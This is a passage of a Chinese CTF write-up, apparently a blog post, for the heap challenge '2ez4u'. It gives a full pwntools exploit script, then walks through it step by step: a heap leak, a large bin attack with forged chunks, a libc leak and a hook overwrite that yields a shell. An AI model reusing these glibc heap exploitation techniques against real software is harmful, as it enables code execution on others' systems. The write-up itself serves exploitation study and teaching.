<p>3、有了地址，我们再利用UAF漏洞实现fastbin的attack，修改arena上的topchunk地址为free_hook上方，接着再malloc就会从新的topchunk地址处切割，就可以修改free_hook为system，然后free一个binsh的堆块既可getshell</p>
<p>先上完整的exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">e=ELF(<span class="string">'./2ez4u'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io=process(<span class="string">'./2ez4u'</span>)</span><br><span class="line">    libc=e.libc</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=remote(<span class="string">''</span>,)</span><br><span class="line"> </span><br><span class="line">base_addr = <span class="number">0x0000555555554000</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">    io.sendline(str(l))</span><br><span class="line">    io.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1000'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'17'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'new description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'0'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'1'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'2'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'3'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'5'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'7'</span>*<span class="number">0x3f0</span>) <span class="comment"># playground</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'8'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3e0</span>, <span class="string">'9'</span>*<span class="number">0x3d0</span>) <span class="comment"># sup</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'a'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'b'</span>*<span class="number">0x3e0</span>) <span class="comment"># victim</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'c'</span>*<span class="number">0x30</span> )</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x9</span>)</span><br><span class="line">dele(<span class="number">0xb</span>)</span><br><span class="line">dele(<span class="number">0x0</span>)</span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'0'</span>*<span class="number">0x400</span>) <span class="comment">#bk_nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">0xb</span>)</span><br><span class="line">io.recvuntil(<span class="string">'num: '</span>)</span><br><span class="line">print(hex(c_uint32(int(io.recvline()[:<span class="number">-1</span>])).value))</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">HEAP = u64(io.recvline()[:<span class="number">-1</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0x7e0</span></span><br><span class="line">log.info(<span class="string">"heap base 0x%016x"</span> % HEAP)</span><br><span class="line"> </span><br><span class="line">target_addr = HEAP+<span class="number">0xb0</span>     <span class="comment"># 1</span></span><br><span class="line">chunk1_addr = HEAP+<span class="number">0x130</span>    <span class="comment"># 2</span></span><br><span class="line">chunk2_addr = HEAP+<span class="number">0x1b0</span>    <span class="comment"># 3</span></span><br><span class="line">victim_addr = HEAP+<span class="number">0xc30</span>    <span class="comment"># b</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># large bin attack</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(chunk1_addr))             <span class="comment"># victim  bk_nextsize</span></span><br><span class="line">edit(<span class="number">0x1</span>, p64(<span class="number">0x0</span>)+p64(chunk1_addr))    <span class="comment"># target  </span></span><br><span class="line"></span><br><span class="line">chunk2  = p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x421</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(chunk1_addr)   <span class="comment">#fd_nextsize</span></span><br><span class="line">edit(<span class="number">0x3</span>, chunk2) <span class="comment"># chunk2</span></span><br><span class="line"></span><br><span class="line">chunk1  = <span class="string">''</span></span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x411</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x18</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x10</span>)</span><br><span class="line">chunk1 += p64(victim_addr)</span><br><span class="line">chunk1 += p64(chunk2_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x2</span>, chunk1) <span class="comment"># chunk1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x7</span>, <span class="string">'7'</span>*<span class="number">0x198</span>+p64(<span class="number">0x410</span>)+p64(<span class="number">0x411</span>)) <span class="comment">#dao da chunk1</span></span><br><span class="line">debug(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0x6</span>) </span><br><span class="line">dele(<span class="number">0x3</span>)</span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'3'</span>*<span class="number">0x30</span>+p64(<span class="number">0xdeadbeefdeadbeef</span>)) <span class="comment"># chunk1, arbitrary write !!!!!!!</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line">show(<span class="number">0x3</span>)</span><br><span class="line">io.recvuntil(<span class="string">'3'</span>*<span class="number">0x30</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">LIBC = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3c4be8</span></span><br><span class="line">log.info(<span class="string">"libc base 0x%016x"</span> % LIBC)</span><br><span class="line"> </span><br><span class="line">junk  = <span class="string">''</span></span><br><span class="line">junk += <span class="string">'3'</span>*<span class="number">0x30</span></span><br><span class="line">junk += p64(<span class="number">0x81</span>)</span><br><span class="line">junk += p64(LIBC+<span class="number">0x3c4be8</span>)</span><br><span class="line">junk += p64(HEAP+<span class="number">0x300</span>)</span><br><span class="line">junk  = junk.ljust(<span class="number">0xa8</span>, <span class="string">'A'</span>)</span><br><span class="line">junk += p64(<span class="number">0x80</span>)</span><br><span class="line"> </span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x80</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x60</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line">dele(<span class="number">0x4</span>)</span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span>) <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x70</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x0</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += <span class="string">'3'</span>*<span class="number">0x30</span></span><br><span class="line">recovery += p64(<span class="number">0x61</span>)</span><br><span class="line">recovery += p64(LIBC+<span class="number">0x3c4b50</span>)</span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,  p64(LIBC+<span class="number">0x3c5c50</span>)) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># recovery</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(HEAP+<span class="number">0x7e0</span>))</span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'/bin/sh'</span>) <span class="comment">#</span></span><br><span class="line">dele(<span class="number">0x1</span>)</span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>*<span class="number">0x1d0</span>+p64(LIBC+<span class="number">0x4526a</span>)) <span class="comment">#</span></span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>1、首先是泄露堆地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,  <span class="string">'0'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'1'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'2'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'3'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'5'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'7'</span>*<span class="number">0x3f0</span>) <span class="comment"># playground</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'8'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3e0</span>, <span class="string">'9'</span>*<span class="number">0x3d0</span>) <span class="comment"># sup</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'a'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'b'</span>*<span class="number">0x3e0</span>) <span class="comment"># victim</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'c'</span>*<span class="number">0x30</span> )</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x9</span>)</span><br><span class="line">dele(<span class="number">0xb</span>)</span><br><span class="line">dele(<span class="number">0x0</span>)</span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'0'</span>*<span class="number">0x400</span>) <span class="comment">#bk_nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">0xb</span>)</span><br><span class="line">io.recvuntil(<span class="string">'num: '</span>)</span><br><span class="line">print(hex(c_uint32(int(io.recvline()[:<span class="number">-1</span>])).value))</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">HEAP = u64(io.recvline()[:<span class="number">-1</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0x7e0</span></span><br><span class="line">log.info(<span class="string">"heap base 0x%016x"</span> % HEAP)</span><br></pre></td></tr></table></figure>

<p><img src="/blog_img/1571238640593.png" alt="57123864059"></p>
<p>可以看到正好是description位置处，利用bins的回收重分配机制，我们实现了第一步。</p>
<p>2、利用堆地址进行largebin的attack：</p>
<p>记清楚这4个我们待会要操作的堆块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target_addr = HEAP+<span class="number">0xb0</span>     <span class="comment"># 1</span></span><br><span class="line">chunk1_addr = HEAP+<span class="number">0x130</span>    <span class="comment"># 2</span></span><br><span class="line">chunk2_addr = HEAP+<span class="number">0x1b0</span>    <span class="comment"># 3</span></span><br><span class="line">victim_addr = HEAP+<span class="number">0xc30</span>    <span class="comment"># b</span></span><br></pre></td></tr></table></figure>

<p>chunk1和chunk2是我们需要伪造的fake_chunk。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0xb</span>, p64(chunk1_addr))</span><br><span class="line">edit(<span class="number">0x1</span>, p64(<span class="number">0x0</span>)+p64(chunk1_addr))</span><br></pre></td></tr></table></figure>

<p>这一步实现了修改bk_nextsize，链接到HEAP+0x130位置处，同时把指针写入到target堆地址中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chunk2  = p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x421</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(chunk1_addr)   <span class="comment">#fd_nextsize</span></span><br><span class="line">edit(<span class="number">0x3</span>, chunk2) <span class="comment"># chunk2</span></span><br></pre></td></tr></table></figure>

<p>在0x1b0的位置实现了fake_chunk2的伪造，fd_nextsize指向0x130</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">chunk1  = <span class="string">''</span></span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x411</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x18</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x10</span>)</span><br><span class="line">chunk1 += p64(victim_addr)</span><br><span class="line">chunk1 += p64(chunk2_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x2</span>, chunk1) <span class="comment"># chunk1</span></span><br></pre></td></tr></table></figure>

<p>这里在0x130位置处实现了fake_chunk1的伪造，同时把FD,BK,fd_nextsize和bk_nextsize都伪造好了，这样largebin的纵向列表就构造好了，横向列表也构造好了。这里重点是纵向列表，如图：</p>
<p><img src="/blog_img/1571294639998.png" alt="57129463999"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0x7</span>, <span class="string">'7'</span>*<span class="number">0x198</span>+p64(<span class="number">0x410</span>)+p64(<span class="number">0x411</span>))</span><br></pre></td></tr></table></figure>

<p>写入size，刚好前一个是HEAP+0x130（size为0x410）。</p>
<p>再次申请时，根据从小到大遍历，会找到HEAP+0x130的fake_chunk堆块并取出来，实现unlink操作，那么就可以控制这个HEAP+0x130处的堆块了，从而有很大的溢出空间，就可以泄露地址了，把下一个的size位覆盖一下成0xdeadbeefdeadbeef，变成没有0截断，然后再次申请一个0x60，让0x7f的地址写入到堆块的FD指针，即可泄露：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'3'</span>*<span class="number">0x30</span>+p64(<span class="number">0xdeadbeefdeadbeef</span>)) <span class="comment"># chunk1, arbitrary write !!!!!!!</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"><span class="comment"># debug(0)</span></span><br><span class="line">show(<span class="number">0x3</span>)</span><br><span class="line">io.recvuntil(<span class="string">'3'</span>*<span class="number">0x30</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">LIBC = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3c4be8</span></span><br><span class="line">log.info(<span class="string">"libc base 0x%016x"</span> % LIBC)</span><br></pre></td></tr></table></figure>

<p>接着我们修复下堆块，把0x80的堆块的FD改为0x60，下一次再次申请0x60的堆块，就会把0x60的数字写入到main_arena+56处，从而可以伪造出一个0x60大小的chunk块的size。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">junk  = <span class="string">''</span></span><br><span class="line">junk += <span class="string">'3'</span>*<span class="number">0x30</span></span><br><span class="line">junk += p64(<span class="number">0x81</span>)</span><br><span class="line">junk += p64(LIBC+<span class="number">0x3c4be8</span>)</span><br><span class="line">junk += p64(HEAP+<span class="number">0x300</span>)</span><br><span class="line">junk  = junk.ljust(<span class="number">0xa8</span>, <span class="string">'A'</span>)</span><br><span class="line">junk += p64(<span class="number">0x80</span>)</span><br><span class="line"> </span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x80</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x60</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line">dele(<span class="number">0x4</span>)</span><br><span class="line">debug(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0x3</span>, recovery)</span><br></pre></td></tr></table></figure>

<p><img src="/blog_img/1571291916722.png" alt="57129191672"></p>
<p><img src="/blog_img/1571292138637.png" alt="57129213863"></p>
<p>伪造size为0x70，FD置为0,并切割，使得不满足0x60的size</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x70</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x0</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line">edit(<span class="number">0x3</span>, recovery) </span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> )</span><br></pre></td></tr></table></figure>

